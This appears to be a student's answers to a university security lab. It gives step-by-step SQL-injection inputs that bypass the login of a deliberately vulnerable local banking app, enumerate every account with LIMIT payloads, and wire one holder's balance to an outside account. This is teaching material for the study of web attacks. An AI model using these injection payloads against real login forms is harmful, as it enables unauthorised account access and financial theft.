For part 3, you are required not to submit an executable exploit, but
instead a transcript of all steps required.

For example, if the task was "log on to CourseWeb", a transcript would
look like:

1. go to http://courseweb.seas.ucla.edu/
2. click LOGIN
3. In the username window, enter your username
4. in the password window, enter your password.
5. Click submit.

The transcript should include *ALL* input or actions required to
perform each task in the assignment.

Q: Show how you can log into an account without knowing any id
numbers ahead of time.

1. go to http://localhost:8118/cgi-bin/FCCU.php
2. Click Account ID Number input field
3. Enter 1 OR 1 = 1
4. Click Password input field
5. Enter ' OR '' = '
6. Click submit button

Q: Show how you can log into *every* account without knowing any
particular id numbers ahead of time. (You can use any id numbers you
discover during the attack but you can't use your "inside knowledge"
of the SQL server.)

1. go to http://localhost:8118/cgi-bin/FCCU.php
2. Click Account ID Number input field
3. Enter 1 OR 1 = 1
4. Click Password input field
5. You can use `' OR 1 = 1 LIMIT n, 1 #` as password where n = 0,1,2,3,etc. n is the index of the rows of `SELECT * from accounts`.
6. For example, to get the first account, enter ' OR 1 = 1 LIMIT 0, 1 #
7. Another example, to get the second account, enter ' OR 1 = 1 LIMIT 1, 1 #
7. Click submit button

Q: Make some account (your choice) wire its total balance to the bank
with routing number "314159265" and account number "271828182845".

1. go to http://localhost:8118/cgi-bin/FCCU.php
2. Click Account ID Number input field
3. Enter 1 OR 1 = 1
4. Click Password input field
5. Enter ' OR '' = '
6. Click submit button
7. You are now logged in as CAMILLE CANTU
8. Copy CAMILLE CANTU's account id under Account Information section (ID is 211)
9. Log out button
10. You are now back to log in page
11. Click Account ID Number input field
12. Paste CAMILLE CANTU's account id (i.e. enter 211)
13. Click Password input field
14. Enter ' OR '' = '
15. Click submit button
16. You are now logged in as CAMILLE CANTU
17. Under wire funds section, click routing number input field.
18. Enter 314159265
19. Click Account Number input field
20. Enter 271828182845
21. Click Wire amount input field
22. Enter 8499
23. Click Wire Money button

Q: Explain why you can't create a new account or arbitrarily update
account balances (or show that you can).

No because mysqli_query() does not allow executing multiple queries, so we cannot inject a second query with INSERT INTO or UPDATE statement. There _are_ some UPDATE statements in FCCU.php source code, so we can potentially make a target account have the same balance as a source account, but we still can't *arbitrarily* set a balance we want.

Q: Estimate how much time you spent on this lab (all 3 parts).

4 days.

Fix the vulnerability in the FCCU.php application and any other tasks
in the lab manual.
